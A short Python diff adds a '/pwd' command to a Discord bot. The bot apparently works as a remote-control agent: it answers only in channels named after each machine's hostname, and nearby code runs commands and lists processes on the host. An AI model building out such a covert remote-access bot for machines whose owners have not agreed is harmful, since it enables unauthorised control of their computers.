@@ -142,6 +142,21 @@ async def sys_action(interaction: discord.Interaction, comando: str):
         await interaction.response.send_message("⚠ Este comando só pode ser usado no canal correspondente!", ephemeral=True)
 
 
+@bot.tree.command(name="pwd", description="Mostra o diretório atual na máquina.")
+async def pwd(interaction: discord.Interaction):
+    if interaction.channel.name.lower() == platform.node().lower():
+        await interaction.response.defer(thinking=True)
+        normal_activity()
+
+        try:
+            current_path = os.getcwd()
+            await interaction.followup.send(f"📁 Path atual:\n`{current_path}`")
+        except Exception as e:
+            await interaction.followup.send(f"❌ Erro ao obter o Path: {e}")
+    else:
+        await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!",ephemeral=True)
+
+
 @bot.tree.command(name="proc", description="Lista os processos em execução na máquina")
 async def process(interaction: discord.Interaction):
     if interaction.channel.name.lower() == platform.node().lower():
